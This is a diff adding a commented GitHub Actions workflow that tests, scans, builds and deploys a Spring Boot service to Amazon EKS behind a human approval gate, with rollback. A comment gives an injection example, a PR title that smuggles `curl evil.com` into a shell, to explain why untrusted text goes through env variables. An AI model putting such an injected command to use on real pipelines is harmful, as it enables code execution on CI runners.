@@ -1,0 +1,768 @@
+# =============================================================================
+# Production pipeline: Java Spring Boot -> Amazon ECR -> Amazon EKS
+#
+# FLOW
+#   PR opened ──▶ test + vulnerability scan ──▶ build & push image
+#             ──▶ report results to the approver ──▶ [HUMAN APPROVAL GATE]
+#             ──▶ deploy to EKS ──▶ verify ──▶ auto-rollback on failure
+#
+# The approval gate is the `environment: production` on the deploy job.
+# GitHub PAUSES the run there and notifies the reviewers configured in
+# Settings -> Environments -> production -> Required reviewers.
+#
+# Concepts demonstrated: OIDC (no stored AWS keys), if: conditions,
+# concurrency, env at three levels, needs + job outputs, matrix, services,
+# caching, artifacts, least-privilege permissions, environments, job
+# summaries, and injection-safe handling of untrusted PR text.
+#
+# SETUP REQUIRED BEFORE THIS RUNS: see README.md in this folder.
+# =============================================================================
+
+name: Spring Boot → EKS (production)
+
+# -----------------------------------------------------------------------------
+# TRIGGERS
+# -----------------------------------------------------------------------------
+on:
+  pull_request:
+    branches: [main]
+    # `ready_for_review` so a draft PR being marked ready starts the pipeline.
+    types: [opened, synchronize, reopened, ready_for_review]
+
+  push:
+    branches: [main]
+
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: 'Existing image tag to deploy (blank = build from this ref)'
+        required: false
+        type: string
+      skip_security:
+        description: 'Skip the security scans (emergency hotfix only)'
+        required: false
+        default: false
+        type: boolean
+
+# -----------------------------------------------------------------------------
+# PERMISSIONS — least privilege at the workflow level.
+# Jobs that need more (OIDC, PR comments) widen it themselves.
+# -----------------------------------------------------------------------------
+permissions:
+  contents: read
+
+# -----------------------------------------------------------------------------
+# CONCURRENCY
+#
+# One group per ref. cancel-in-progress is an EXPRESSION: true for PRs (a new
+# commit makes the old run pointless) but false for main/manual runs, because
+# cancelling a deploy halfway leaves a half-applied release.
+# -----------------------------------------------------------------------------
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
+
+# -----------------------------------------------------------------------------
+# ENV — workflow level, visible to every job.
+# Non-secret config; anything sensitive goes in secrets/vars.
+# -----------------------------------------------------------------------------
+env:
+  AWS_REGION: ap-south-1
+  ECR_REPOSITORY: spring-boot-app
+  EKS_CLUSTER_NAME: prod-eks-cluster
+  K8S_NAMESPACE: production
+  K8S_DEPLOYMENT: spring-boot-app
+  K8S_CONTAINER: app
+  JAVA_VERSION: '21'
+  JAVA_DISTRIBUTION: temurin
+  # Maven 3.9+ reads MAVEN_ARGS from the environment, so every `mvn` call
+  # below picks these up without the shell having to word-split a variable.
+  #   -B    batch mode: no ANSI codes, no interactive prompts
+  #   -ntp  hide the "Downloading..." spam that bloats CI logs
+  # (setup-java's `cache: maven` handles ~/.m2 caching, so no repo path here.)
+  MAVEN_ARGS: '-B -ntp'
+
+jobs:
+
+  # ===========================================================================
+  # 1. SETUP — compute everything downstream needs, once.
+  # ===========================================================================
+  setup:
+    name: Setup & versioning
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    outputs:
+      image_tag: ${{ steps.meta.outputs.image_tag }}
+      version: ${{ steps.meta.outputs.version }}
+      should_deploy: ${{ steps.gate.outputs.should_deploy }}
+      run_security: ${{ steps.gate.outputs.run_security }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # Full history so `git describe`/changelogs work. Default is depth 1.
+          fetch-depth: 0
+
+      - name: Compute image tag and version
+        id: meta
+        run: |
+          set -euo pipefail
+          # An immutable, traceable tag. NEVER deploy `latest` to production —
+          # you lose the ability to say what is actually running.
+          SHORT_SHA="$(git rev-parse --short=8 HEAD)"
+
+          if [[ -n "${{ inputs.image_tag }}" ]]; then
+            TAG="${{ inputs.image_tag }}"                 # redeploy an existing image
+          else
+            TAG="sha-${SHORT_SHA}"
+          fi
+
+          VERSION="$(mvn -q -DforceStdout \
+                      help:evaluate -Dexpression=project.version 2>/dev/null || echo '0.0.0')"
+
+          echo "image_tag=${TAG}"   >> "$GITHUB_OUTPUT"
+          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
+          echo "Resolved tag=${TAG} version=${VERSION}"
+
+      - name: Decide what this run should do
+        id: gate
+        run: |
+          set -euo pipefail
+          # Deploy on: merge to main, manual dispatch, or a PR that has passed
+          # the approval gate. Draft PRs validate but never reach deploy.
+          if [[ "${{ github.event.pull_request.draft }}" == "true" ]]; then
+            echo "should_deploy=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "should_deploy=true"  >> "$GITHUB_OUTPUT"
+          fi
+
+          if [[ "${{ inputs.skip_security }}" == "true" ]]; then
+            echo "run_security=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "run_security=true"  >> "$GITHUB_OUTPUT"
+          fi
+
+  # ===========================================================================
+  # 2. TEST — unit + integration, against a real Postgres.
+  # ===========================================================================
+  test:
+    name: Test (Java ${{ matrix.java }})
+    needs: setup
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+
+    strategy:
+      # See failures on EVERY Java version, not just the first to break.
+      fail-fast: false
+      matrix:
+        java: ['21']
+        # Add '17' here when you need to prove compatibility across LTS versions.
+
+    # Sidecar containers. Health checks are NOT optional — without them the
+    # tests start before Postgres accepts connections and fail intermittently.
+    services:
+      postgres:
+        image: postgres:16-alpine
+        env:
+          POSTGRES_DB: appdb
+          POSTGRES_USER: appuser
+          POSTGRES_PASSWORD: apppass
+        ports: ['5432:5432']
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+      redis:
+        image: redis:7-alpine
+        ports: ['6379:6379']
+        options: >-
+          --health-cmd "redis-cli ping"
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+    # JOB-level env — merged with the workflow env, overriding on conflict.
+    env:
+      SPRING_PROFILES_ACTIVE: test
+      SPRING_DATASOURCE_URL: jdbc:postgresql://localhost:5432/appdb
+      SPRING_DATASOURCE_USERNAME: appuser
+      SPRING_DATASOURCE_PASSWORD: apppass
+      SPRING_DATA_REDIS_HOST: localhost
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK ${{ matrix.java }}
+        uses: actions/setup-java@v4
+        with:
+          java-version: ${{ matrix.java }}
+          distribution: ${{ env.JAVA_DISTRIBUTION }}
+          cache: maven          # caches ~/.m2 keyed on pom.xml hashes
+
+      - name: Compile
+        run: mvn compile
+
+      - name: Unit tests
+        run: mvn test
+
+      - name: Integration tests
+        # STEP-level env — narrowest scope, only this step sees it.
+        env:
+          SPRING_PROFILES_ACTIVE: integration
+        run: mvn verify -DskipUnitTests=true
+
+      - name: Coverage report
+        run: mvn jacoco:report
+
+      # if: always() so reports are captured PRECISELY when tests failed —
+      # which is exactly when you need them.
+      - name: Upload test results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: test-results-java${{ matrix.java }}
+          path: |
+            target/surefire-reports/
+            target/failsafe-reports/
+            target/site/jacoco/
+          retention-days: 14
+
+      - name: Test summary
+        if: always()
+        run: |
+          set -euo pipefail
+          {
+            echo "## Test results — Java ${{ matrix.java }}"
+            echo ""
+            if [[ -d target/surefire-reports ]]; then
+              TOTAL=$(grep -ho 'tests="[0-9]*"' target/surefire-reports/*.xml 2>/dev/null \
+                      | grep -o '[0-9]*' | paste -sd+ - | bc || echo 0)
+              FAILED=$(grep -ho 'failures="[0-9]*"' target/surefire-reports/*.xml 2>/dev/null \
+                      | grep -o '[0-9]*' | paste -sd+ - | bc || echo 0)
+              echo "| Metric | Value |"
+              echo "|---|---|"
+              echo "| Tests run | ${TOTAL} |"
+              echo "| Failures | ${FAILED} |"
+            else
+              echo "No surefire reports found."
+            fi
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # ===========================================================================
+  # 3. SECURITY — several scanners in parallel via a matrix.
+  # ===========================================================================
+  security:
+    name: Scan (${{ matrix.scanner }})
+    needs: setup
+    if: needs.setup.outputs.run_security == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    permissions:
+      contents: read
+      security-events: write     # required to upload SARIF to code scanning
+
+    strategy:
+      fail-fast: false
+      matrix:
+        scanner: [dependencies, sast, secrets, iac]
+
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0         # gitleaks needs history to scan past commits
+
+      - name: Set up JDK
+        if: matrix.scanner == 'dependencies' || matrix.scanner == 'sast'
+        uses: actions/setup-java@v4
+        with:
+          java-version: ${{ env.JAVA_VERSION }}
+          distribution: ${{ env.JAVA_DISTRIBUTION }}
+          cache: maven
+
+      # --- Vulnerable third-party libraries (CVE scan of the dependency tree)
+      - name: OWASP dependency check
+        if: matrix.scanner == 'dependencies'
+        run: |
+          set -euo pipefail
+          mvn org.owasp:dependency-check-maven:check \
+            -DfailBuildOnCVSS=7 \
+            -DsuppressionFile=.security/suppressions.xml \
+            -Dformats=HTML,JSON,SARIF || echo "SCAN_FAILED=true" >> "$GITHUB_ENV"
+
+      - name: Upload dependency SARIF
+        if: matrix.scanner == 'dependencies' && always()
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: target/dependency-check-report.sarif
+          category: owasp-dependency-check
+        continue-on-error: true
+
+      # --- Static analysis of your own source
+      - name: CodeQL init
+        if: matrix.scanner == 'sast'
+        uses: github/codeql-action/init@v3
+        with:
+          languages: java
+          queries: security-extended
+
+      - name: Build for CodeQL
+        if: matrix.scanner == 'sast'
+        run: mvn clean compile -DskipTests
+
+      - name: CodeQL analyze
+        if: matrix.scanner == 'sast'
+        uses: github/codeql-action/analyze@v3
+        with:
+          category: /language:java
+
+      # --- Committed credentials
+      - name: Secret scan
+        if: matrix.scanner == 'secrets'
+        uses: gitleaks/gitleaks-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # --- Misconfigured Dockerfile / Kubernetes manifests
+      - name: Trivy config scan
+        if: matrix.scanner == 'iac'
+        uses: aquasecurity/trivy-action@0.28.0
+        with:
+          scan-type: config
+          scan-ref: .
+          severity: HIGH,CRITICAL
+          exit-code: '1'
+          format: sarif
+          output: trivy-config.sarif
+
+      - name: Upload IaC SARIF
+        if: matrix.scanner == 'iac' && always()
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: trivy-config.sarif
+          category: trivy-config
+        continue-on-error: true
+
+  # ===========================================================================
+  # 4. BUILD & PUSH — the artifact that will actually be deployed.
+  # ===========================================================================
+  build-push:
+    name: Build & push image
+    needs: [setup, test, security]
+    # `always() &&` lets this run when `security` was SKIPPED (emergency
+    # hotfix), while still requiring `test` to have genuinely succeeded.
+    if: |
+      always() &&
+      needs.test.result == 'success' &&
+      (needs.security.result == 'success' || needs.security.result == 'skipped')
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    permissions:
+      contents: read
+      id-token: write            # REQUIRED for OIDC — omitting it fails oddly
+
+    outputs:
+      image_uri: ${{ steps.push.outputs.image_uri }}
+      image_digest: ${{ steps.push.outputs.image_digest }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK
+        uses: actions/setup-java@v4
+        with:
+          java-version: ${{ env.JAVA_VERSION }}
+          distribution: ${{ env.JAVA_DISTRIBUTION }}
+          cache: maven
+
+      - name: Package (skip tests — already run)
+        run: mvn clean package -DskipTests
+
+      - name: Upload JAR
+        uses: actions/upload-artifact@v4
+        with:
+          name: app-jar-${{ needs.setup.outputs.image_tag }}
+          path: target/*.jar
+          retention-days: 30
+
+      # --- OIDC: short-lived credentials, no AWS keys stored anywhere -------
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_BUILD_ROLE_ARN }}
+          aws-region: ${{ env.AWS_REGION }}
+          role-session-name: gha-build-${{ github.run_id }}
+
+      - name: Verify identity
+        run: aws sts get-caller-identity
+
+      - name: Log in to ECR
+        id: ecr
+        uses: aws-actions/amazon-ecr-login@v2
+
+      - uses: docker/setup-buildx-action@v3
+
+      - name: Build image
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          file: ./Dockerfile
+          # Build locally first so it can be SCANNED before it is pushed.
+          load: true
+          push: false
+          tags: ${{ env.ECR_REPOSITORY }}:${{ needs.setup.outputs.image_tag }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+          build-args: |
+            JAVA_VERSION=${{ env.JAVA_VERSION }}
+
+      - name: Scan image for vulnerabilities
+        uses: aquasecurity/trivy-action@0.28.0
+        with:
+          image-ref: ${{ env.ECR_REPOSITORY }}:${{ needs.setup.outputs.image_tag }}
+          severity: HIGH,CRITICAL
+          ignore-unfixed: true      # don't block on CVEs with no available fix
+          exit-code: '1'            # FAIL the build — never push a vulnerable image
+          format: table
+
+      - name: Push to ECR
+        id: push
+        env:
+          REGISTRY: ${{ steps.ecr.outputs.registry }}
+          TAG: ${{ needs.setup.outputs.image_tag }}
+        run: |
+          set -euo pipefail
+          LOCAL="${ECR_REPOSITORY}:${TAG}"
+          REMOTE="${REGISTRY}/${ECR_REPOSITORY}:${TAG}"
+
+          docker tag "${LOCAL}" "${REMOTE}"
+          docker push "${REMOTE}"
+
+          DIGEST="$(docker inspect --format='{{index .RepoDigests 0}}' "${REMOTE}" | cut -d@ -f2)"
+
+          echo "image_uri=${REMOTE}"   >> "$GITHUB_OUTPUT"
+          echo "image_digest=${DIGEST}" >> "$GITHUB_OUTPUT"
+          echo "Pushed ${REMOTE} (${DIGEST})"
+
+  # ===========================================================================
+  # 5. REPORT TO APPROVER — everything they need to make the decision,
+  #    posted BEFORE the gate so it's waiting for them.
+  # ===========================================================================
+  request-approval:
+    name: Notify approver
+    needs: [setup, test, security, build-push]
+    if: always() && needs.build-push.result == 'success'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    permissions:
+      contents: read
+      pull-requests: write         # to comment on the PR
+
+    steps:
+      - name: Build the summary
+        # UNTRUSTED INPUT goes through env, NEVER interpolated into the script.
+        # A PR titled `a"; curl evil.com; #` would otherwise execute.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          IMAGE_URI: ${{ needs.build-push.outputs.image_uri }}
+          IMAGE_DIGEST: ${{ needs.build-push.outputs.image_digest }}
+          TEST_RESULT: ${{ needs.test.result }}
+          SEC_RESULT: ${{ needs.security.result }}
+          VERSION: ${{ needs.setup.outputs.version }}
+        run: |
+          set -euo pipefail
+          {
+            echo "## 🚦 Production deployment awaiting approval"
+            echo ""
+            echo "| Check | Result |"
+            echo "|---|---|"
+            echo "| Tests | ${TEST_RESULT} |"
+            echo "| Security scans | ${SEC_RESULT} |"
+            echo "| Image built | ✅ |"
+            echo ""
+            echo "| Detail | Value |"
+            echo "|---|---|"
+            echo "| Version | \`${VERSION}\` |"
+            echo "| Image | \`${IMAGE_URI}\` |"
+            echo "| Digest | \`${IMAGE_DIGEST}\` |"
+            echo "| Commit | \`${GITHUB_SHA}\` |"
+            echo "| Triggered by | @${GITHUB_ACTOR} |"
+            echo ""
+            echo "**Author:** ${PR_AUTHOR}"
+            echo ""
+            echo "> Approve in the **Actions** tab to release to production."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          cp "$GITHUB_STEP_SUMMARY" /tmp/summary.md
+
+      - name: Comment on the PR
+        if: github.event_name == 'pull_request'
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs');
+            const body = fs.readFileSync('/tmp/summary.md', 'utf8');
+            await github.rest.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body,
+            });
+
+      - name: Notify Slack
+        if: vars.SLACK_WEBHOOK_CONFIGURED == 'true'
+        env:
+          WEBHOOK: ${{ secrets.SLACK_WEBHOOK_URL }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -euo pipefail
+          curl -sS -X POST -H 'Content-type: application/json' \
+            --data "{\"text\":\"Production deploy awaiting approval: ${RUN_URL}\"}" \
+            "${WEBHOOK}"
+
+  # ===========================================================================
+  # 6. DEPLOY — the APPROVAL GATE.
+  #
+  # `environment: production` is what pauses the run. Configure required
+  # reviewers in Settings -> Environments -> production. Nothing in the YAML
+  # expresses "wait for a human" — the environment does.
+  # ===========================================================================
+  deploy-production:
+    name: Deploy to EKS (needs approval)
+    needs: [setup, build-push, request-approval]
+    if: |
+      always() &&
+      needs.build-push.result == 'success' &&
+      needs.setup.outputs.should_deploy == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    environment:
+      name: production            # <-- THE HUMAN APPROVAL GATE
+      url: https://app.example.com
+
+    # Deploy-specific concurrency, deliberately WITHOUT cancel-in-progress:
+    # two deploys must queue, never race or be cancelled mid-apply.
+    concurrency:
+      group: deploy-production
+      cancel-in-progress: false
+
+    permissions:
+      contents: read
+      id-token: write             # OIDC
+
+    outputs:
+      previous_image: ${{ steps.current.outputs.previous_image }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          # A DIFFERENT, more privileged role than the build job's, and its
+          # trust policy is pinned to `environment:production` — so only an
+          # approved job can assume it.
+          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
+          aws-region: ${{ env.AWS_REGION }}
+          role-session-name: gha-deploy-${{ github.run_id }}
+
+      - name: Update kubeconfig
+        run: |
+          set -euo pipefail
+          aws eks update-kubeconfig \
+            --name "${EKS_CLUSTER_NAME}" \
+            --region "${AWS_REGION}"
+          kubectl config current-context
+
+      - name: Record the currently running image (for rollback)
+        id: current
+        run: |
+          set -euo pipefail
+          PREV="$(kubectl get deployment "${K8S_DEPLOYMENT}" \
+                   -n "${K8S_NAMESPACE}" \
+                   -o jsonpath='{.spec.template.spec.containers[0].image}' 2>/dev/null || echo 'none')"
+          echo "previous_image=${PREV}" >> "$GITHUB_OUTPUT"
+          echo "Currently running: ${PREV}"
+
+      - name: Deploy
+        env:
+          IMAGE_URI: ${{ needs.build-push.outputs.image_uri }}
+        run: |
+          set -euo pipefail
+          kubectl set image "deployment/${K8S_DEPLOYMENT}" \
+            "${K8S_CONTAINER}=${IMAGE_URI}" \
+            -n "${K8S_NAMESPACE}" \
+            --record=false
+
+          # Annotate so `kubectl rollout history` can be traced back to a run.
+          kubectl annotate "deployment/${K8S_DEPLOYMENT}" \
+            -n "${K8S_NAMESPACE}" --overwrite \
+            "app.kubernetes.io/version=${{ needs.setup.outputs.version }}" \
+            "deploy.github.com/run-id=${GITHUB_RUN_ID}" \
+            "deploy.github.com/commit=${GITHUB_SHA}" \
+            "deploy.github.com/actor=${GITHUB_ACTOR}"
+
+      - name: Wait for rollout
+        # This is what turns "we applied a manifest" into "it is actually
+        # serving". Without --timeout the step would hang until the job dies.
+        run: |
+          set -euo pipefail
+          kubectl rollout status "deployment/${K8S_DEPLOYMENT}" \
+            -n "${K8S_NAMESPACE}" \
+            --timeout=5m
+
+      - name: Show pod state
+        if: always()
+        run: |
+          kubectl get pods -n "${K8S_NAMESPACE}" \
+            -l "app=${K8S_DEPLOYMENT}" -o wide || true
+
+  # ===========================================================================
+  # 7. VERIFY — prove it works, from outside the cluster.
+  # ===========================================================================
+  smoke-test:
+    name: Smoke test
+    needs: [setup, deploy-production]
+    if: needs.deploy-production.result == 'success'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    permissions:
+      contents: read
+      id-token: write
+
+    env:
+      HEALTH_PATH: /actuator/health      # Spring Boot Actuator
+      READY_PATH: /actuator/health/readiness
+
+    steps:
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
+          aws-region: ${{ env.AWS_REGION }}
+
+      - name: Update kubeconfig
+        run: aws eks update-kubeconfig --name "${EKS_CLUSTER_NAME}" --region "${AWS_REGION}"
+
+      - name: Probe the service from inside the cluster
+        run: |
+          set -euo pipefail
+          kubectl run "smoke-${GITHUB_RUN_ID}" \
+            -n "${K8S_NAMESPACE}" \
+            --image=curlimages/curl:8.10.1 \
+            --restart=Never --rm -i --quiet --command -- \
+            curl -sf --max-time 10 --retry 5 --retry-delay 5 \
+              "http://${K8S_DEPLOYMENT}.${K8S_NAMESPACE}.svc.cluster.local:8080${HEALTH_PATH}"
+
+      - name: Confirm all replicas are ready
+        run: |
+          set -euo pipefail
+          DESIRED=$(kubectl get deploy "${K8S_DEPLOYMENT}" -n "${K8S_NAMESPACE}" -o jsonpath='{.spec.replicas}')
+          READY=$(kubectl get deploy "${K8S_DEPLOYMENT}" -n "${K8S_NAMESPACE}" -o jsonpath='{.status.readyReplicas}')
+          echo "ready=${READY:-0} desired=${DESIRED}"
+          [[ "${READY:-0}" == "${DESIRED}" ]] || { echo "Not all replicas ready"; exit 1; }
+
+  # ===========================================================================
+  # 8. ROLLBACK — automatic, only when a deploy or smoke test actually failed.
+  # ===========================================================================
+  rollback:
+    name: Rollback
+    needs: [deploy-production, smoke-test]
+    # `!cancelled()` rather than `always()`: if a human pressed Cancel we do
+    # NOT want to start an unattended rollback.
+    if: |
+      !cancelled() &&
+      needs.deploy-production.result == 'success' &&
+      needs.smoke-test.result == 'failure'
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    environment:
+      name: production            # rollback touches prod, so same gate applies
+
+    permissions:
+      contents: read
+      id-token: write
+
+    steps:
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
+          aws-region: ${{ env.AWS_REGION }}
+
+      - name: Update kubeconfig
+        run: aws eks update-kubeconfig --name "${EKS_CLUSTER_NAME}" --region "${AWS_REGION}"
+
+      - name: Undo the rollout
+        run: |
+          set -euo pipefail
+          kubectl rollout undo "deployment/${K8S_DEPLOYMENT}" -n "${K8S_NAMESPACE}"
+          kubectl rollout status "deployment/${K8S_DEPLOYMENT}" -n "${K8S_NAMESPACE}" --timeout=5m
+
+      - name: Report the rollback
+        env:
+          PREVIOUS: ${{ needs.deploy-production.outputs.previous_image }}
+        run: |
+          {
+            echo "## ⚠️ Deployment rolled back"
+            echo ""
+            echo "Smoke tests failed after deploying, so the previous version was restored."
+            echo ""
+            echo "- Rolled back to: \`${PREVIOUS}\`"
+            echo "- Failed commit: \`${GITHUB_SHA}\`"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # ===========================================================================
+  # 9. FINAL STATUS — always runs, so you get one authoritative outcome.
+  # ===========================================================================
+  report:
+    name: Final status
+    needs: [test, security, build-push, deploy-production, smoke-test, rollback]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Write the outcome
+        env:
+          TEST: ${{ needs.test.result }}
+          SEC: ${{ needs.security.result }}
+          BUILD: ${{ needs.build-push.result }}
+          DEPLOY: ${{ needs.deploy-production.result }}
+          SMOKE: ${{ needs.smoke-test.result }}
+          ROLLBACK: ${{ needs.rollback.result }}
+        run: |
+          set -euo pipefail
+          icon() { case "$1" in
+            success) echo '✅';; failure) echo '❌';;
+            skipped) echo '⏭️';; cancelled) echo '🚫';; *) echo '❔';;
+          esac; }
+          {
+            echo "## Pipeline summary"
+            echo ""
+            echo "| Stage | Result |"
+            echo "|---|---|"
+            echo "| Tests | $(icon "$TEST") $TEST |"
+            echo "| Security | $(icon "$SEC") $SEC |"
+            echo "| Build & push | $(icon "$BUILD") $BUILD |"
+            echo "| Deploy | $(icon "$DEPLOY") $DEPLOY |"
+            echo "| Smoke test | $(icon "$SMOKE") $SMOKE |"
+            echo "| Rollback | $(icon "$ROLLBACK") $ROLLBACK |"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # Make the workflow red if anything that mattered failed.
+      - name: Fail the run if a critical stage failed
+        if: |
+          needs.test.result == 'failure' ||
+          needs.build-push.result == 'failure' ||
+          needs.deploy-production.result == 'failure' ||
+          needs.smoke-test.result == 'failure'
+        run: |
+          echo "A critical stage failed — see the summary above."
+          exit 1
